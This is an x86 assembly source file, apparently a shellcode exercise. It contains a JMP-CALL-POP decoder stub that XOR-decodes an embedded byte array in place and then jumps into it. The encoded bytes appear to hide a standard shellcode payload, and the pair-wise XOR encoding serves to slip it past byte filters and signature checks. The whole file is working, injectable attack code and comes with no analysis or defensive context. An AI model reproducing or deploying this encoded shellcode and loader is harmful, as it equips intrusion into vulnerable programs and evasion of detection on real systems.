
global _start

section .text

_start:
	jmp short call_shellcode
	
decoder:
	;esi is base of shellcode array
	pop esi	
	;let ecx be index for where to place read byte
	xor ecx, ecx
	;edx is the index for read byte
	xor edx, edx
	;eax used for short time saving of read byte
	xor eax, eax
decode:
	;Read instruction byte
	mov al, byte [esi+edx]
	;Read byte to xor with
	inc dl
	xor al, byte[esi+edx]
	;increment counter for read byte
	inc dl

	;Write byte in correct location and increment counter
	mov [esi+ecx], al 
	inc ecx
	
	;While edx<shellcodelength, go for loop
	cmp edx, ShellcodeLength
	jb decode
	
	jmp short EncodedShellcode

call_shellcode:
	call decoder

EncodedShellcode: db 0x8c,0xbd,0x2d,0xed,0x47,0x17,0x3b,0x53,0xa4,0xc6,0xe6,0x87,0x53,0x20,0x93,0xfb,0x7b,0x13,0xd3,0xfc,0x10,0x3f,0x7a,0x55,0x46,0x69,0xf5,0x9d,0x13,0x3c,0x08,0x6a,0x59,0x30,0x0c,0x62,0x41,0xc8,0x71,0x92,0x4e,0x1e,0x6a,0xe3,0xf8,0x1a,0x80,0xd3,0xe6,0x6f,0xe8,0x09,0x47,0xf7,0xd1,0xda,0x73,0xbe,0x39,0xb9
ShellcodeLength equ $-EncodedShellcode
